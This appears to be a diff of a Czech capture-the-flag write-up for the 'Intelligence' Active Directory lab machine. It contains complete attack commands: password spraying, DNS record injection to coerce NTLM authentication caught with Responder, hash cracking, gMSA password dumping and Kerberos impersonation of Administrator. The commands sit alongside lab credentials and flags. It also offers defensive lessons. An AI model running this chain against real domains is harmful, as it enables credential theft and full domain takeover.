@@ -7,153 +7,121 @@ tags: windows smb kerberos ldap active-directory
 ---
 ## Úvod a kontext
 
-Intelligence dobře ukazuje, že průlom často nezačíná jedním exploitem, ale kombinací signálů jako `dc.intelligence.htb`, SMB sdílení a Kerberos.
+Intelligence je pěkný Active Directory stroj postavený na kombinaci veřejně dostupných dokumentů, Kerberos enumerace a zneužití interní automatizace. První polovina nevypadá dramaticky: web server publikuje PDF dokumenty a jejich metadata. Právě z nich se ale poskládá seznam uživatelů a nakonec i výchozí heslo pro jeden účet.
 
-Praktická část pak stojí na tom, jak se tyto zjištěné vazby promění v přístup přes SMB sdílení a jak je po user části využitelná lokální enumeraci po získání shellu.
+Root část je ještě zajímavější. Přístup `Tiffany.Molina` nestačí k shellu, ale stačí k přečtení skriptu `downdetector.ps1`, který běží plánovaně a navštěvuje DNS jména začínající na `web`. Přes vlastní DNS záznam se tak podaří vynutit autentizaci `Ted.Graves`, cracknout jeho heslo, získat heslo gMSA účtu `svc_int$` a s ním si vyžádat Kerberos ticket pro `Administrator`.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### Doménový kontroler a veřejné dokumenty
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Už první `nmap` ukazuje doménový kontroler `dc.intelligence.htb`. Vedle klasických AD služeb je ale zajímavý i IIS na portu `80`, protože právě tam leží první použitelné stopy.
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
 ```
-```
-PORT      STATE SERVICE       VERSION
+```text
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-favicon: Unknown favicon MD5: __CENSORED__
-| http-methods:
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Intelligence
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-29 22:49:14Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=dc.intelligence.htb
-| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
-| Issuer: commonName=intelligence-DC-CA
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2021-04-19T00:43:16
-| Not valid after:  2022-04-19T00:43:16
-| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
-|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
-|_ssl-date: 2021-10-29T22:50:46+00:00; +7h03m36s from scanner time.
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
 445/tcp   open  microsoft-ds?
-[... výstup zkrácen ...]
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 7h03m35s, deviation: 0s, median: 7h03m35s
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled and required
-| smb2-time:
-|   date: 2021-10-29T22:50:05
-|_  start_date: N/A
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-### Enumerace SMB
-
-U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
-```bash
-smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R --depth 1
-```
-```
-[+] IP: intelligence.htb:445    Name: unknown
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       Remote IPC
-        .\IPC$\*
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    InitShutdown
-        fr--r--r--                5 Mon Jan  1 00:57:44 1601    lsass
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    ntsvcs
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    scerpc
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-390-0
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    epmapper
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-1c4-0
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    LSM_API_service
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    eventlog
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-280-0
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    atsvc
-        fr--r--r--                4 Mon Jan  1 00:57:44 1601    wkssvc
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-4ec-0
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-24c-0
-        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-24c-1
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    RpcProxy\49691
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    6f2901363fb76a9e
-        fr--r--r--                3 Mon Jan  1 00:57:44 1601    RpcProxy\593
-[... výstup zkrácen ...]
-        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
-        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
-        fr--r--r--               20 Mon Apr 19 02:51:46 2021    ntuser.ini
-        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Pictures
-        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Recent
-        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Saved Games
-        dr--r--r--                0 Mon Apr 19 02:51:46 2021    SendTo
-        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Start Menu
-        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Templates
-        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Videos
+Na webu je adresář `/documents/` a soubory pojmenované po datu. To je důležitý vzor: jakmile je naming predictable, není potřeba čekat na index listing, ale lze generovat URL a stáhnout si celý archiv dokumentů.
+```text
+twebdiscover -u http://$IP -t 40 -Po -wdc
+=> /documents/
+=> /documents/2020-01-01-upload.pdf
+=> /documents/2020-12-15-upload.pdf
 ```
 
-### Enumerace SMB (2)
+### Metadata PDF a seznam uživatelů
 
-U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
-```bash
-impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@intelligence.htb
+Stažené PDF soubory mají v metadatech jména autorů. `exiftool` tak rychle odhalí první validní uživatele jako `William.Lee` a `Jose.Williams`. Jakmile se ukáže, že tento způsob funguje, dává smysl stáhnout systematicky všechny datumové varianty, vyextrahovat další `Creator` hodnoty a ověřit je přes `kerbrute`.
+```text
+exiftool *.pdf
+Creator : William.Lee
+Creator : Jose.Williams
+
+./kerbrute_linux_amd64 userenum --dc intelligence.htb -d intelligence.htb Machines/Intelligence/users.txt
+=> VALID USERNAME: William.Lee@intelligence.htb
+=> VALID USERNAME: Jose.Williams@intelligence.htb
 ```
+
+Právě jedna z historických nahrávek, `2020-06-04-upload.pdf`, pak obsahuje rozhodující detail: výchozí heslo `NewIntelligenceCorpUser9876`.
 
 ## Analýza zjištění
 
-### Lámání hesel nebo hashů
+### Od výchozího hesla k účtu `Tiffany.Molina`
 
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Jakmile dokument prozradí defaultní heslo, je rozumné ho vyzkoušet proti celé sadě validních uživatelů. `crackmapexec` potvrdí, že funguje pro `Tiffany.Molina`, což okamžitě otevírá SMB přístup.
+```text
+crackmapexec smb intelligence.htb -u Machines/Intelligence/users.txt -p NewIntelligenceCorpUser9876
+=> intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
 ```
+
+### Co prozradí SMB a `downdetector.ps1`
+
+SMB přístup tady není jen kvůli `user.txt`. Ve share `IT` leží skript `downdetector.ps1`, který je z bezpečnostního pohledu mnohem cennější. Prochází DNS záznamy začínající na `web*` a na každý z nich posílá `Invoke-WebRequest -UseDefaultCredentials`.
+```text
+smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R --depth 1
+=> IT READ ONLY
+=> downdetector.ps1
 ```
-=> Mr.Teddy         (Ted.Graves)
-```
+
+To je přesně ten typ automatizace, který se dá zneužít ke coerced authentication. Pokud lze do DNS přidat vlastní `web*` záznam, skript každých pět minut naváže HTTP spojení s útočníkovým serverem a pošle přitom NTLM autentizaci uživatele `Ted.Graves`.
 
 ## Získání přístupu
 
-### Získání user flagu
+### SMB jako `Tiffany.Molina`
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-```bash
+Účet `Tiffany.Molina` nedává interaktivní shell, ale stačí k přístupu do uživatelských share. Tím se potvrzuje běžný uživatelský kontext a zároveň vzniká prostor pro čtení dalších interních skriptů.
+```text
+impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@intelligence.htb
 cat user.txt
-```
-```
-__CENSORED__
+c678168bde461de7eff5f37a310d6178
 ```
 
 ## Eskalace oprávnění
 
-### Získání root flagu
+### Vynucená autentizace `Ted.Graves`
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-```bash
+První část rootu spočívá v DNS záznamu a naslouchání na HTTP. Přes `dnstool.py` se přidá `webthacker.intelligence.htb`, Responder zachytí NTLMv2 hash `Ted.Graves` a `john` ho crackne na `Mr.Teddy`.
+```text
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webthacker.intelligence.htb' -d 10.10.14.11 10.10.10.248
+sudo responder -I tun0 -A
+=> [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:...
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+=> Mr.Teddy         (Ted.Graves)
+```
+
+### gMSA účet `svc_int$` a impersonace administrátora
+
+Účet `Ted.Graves` sám o sobě ještě root nedává, ale `gMSADumper.py` ukáže, že skupina `itsupport` smí číst heslo gMSA účtu `svc_int$`. Jakmile je k dispozici NTLM hash gMSA, lze přes `impacket-getST` vyžádat service ticket pro `WWW/dc.intelligence.htb` a rovnou při tom impersonovat `Administrator`.
+```text
+python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::c699eaac79b69357d9dabee3379547e6
+
+impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
 cat root.txt
-```
-```
-__CENSORED__
+e4de96de9930d2f4e8b5bd533856e90d
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Z hlediska rozhodování bylo nejdůležitější správně přečíst vazbu mezi `dc.intelligence.htb`, SMB sdílení a Kerberos.
-- K uživatelskému kontextu vedl konkrétní a ověřitelný krok: přístup přes SMB sdílení.
-- Poslední část ukazuje, že po získání shellu rozhoduje hlavně to, jakou roli hraje lokální enumerace po získání shellu.
+- Intelligence začíná nenápadně, ale systematicky: veřejné PDF, metadata autorů, validní uživatelé a výchozí heslo.
+- Účet `Tiffany.Molina` nebyl cíl, ale čtecí pivot ke skriptu `downdetector.ps1`, který šel zneužít k vynucené autentizaci jiného uživatele.
+- Root část je čistě o Active Directory a delegovaných právech. Jakmile lze číst heslo gMSA a vyžádat ticket pro cizí identitu, lokální shell už není potřeba.
 
 ## Co si odnést do praxe
 
-- Pokud se zanedbá oblast `dc.intelligence.htb`, SMB sdílení a Kerberos, vznikne stejný typ vstupu jako tady. SMB sdílení mají mít opravdu minimální ACL a průběžný audit obsahu; i read-only přístup často útočníkovi dá víc než samotná zranitelnost služby.
-- Jakmile útočník ověří přístup přes SMB sdílení, je potřeba počítat s dlouhodobým přístupem. Share s dokumenty a exporty je potřeba posuzovat jako zdroj identit a tajemství; obsah sdílení bývá pro další pivot důležitější než samotná síťová služba.
-- Stejně důležitá je i obrana proti mechanice lokální enumerace po získání shellu. Po získání shellu je rozhodující systematická lokální enumerace; i bez další CVE často rozhodne kombinace špatných oprávnění, reuse tajemství a pomocných skriptů.
+- Veřejně publikované dokumenty musí projít stejnou redakční kontrolou jako zdrojový kód. Metadata autorů a interní instrukce typu výchozího hesla mohou být první a nejlevnější vstup do domény.
+- Automatizační skripty používající `Invoke-WebRequest -UseDefaultCredentials` nad dynamickými DNS záznamy jsou nebezpečné. Jakmile útočník může ovlivnit DNS, script se mění v NTLM hash relay/coercion primitivum.
+- gMSA účty je potřeba auditovat nejen z pohledu toho, kde běží, ale hlavně kdo smí číst jejich heslo. Na Intelligence právě tohle právo rozhodlo o celé root části.
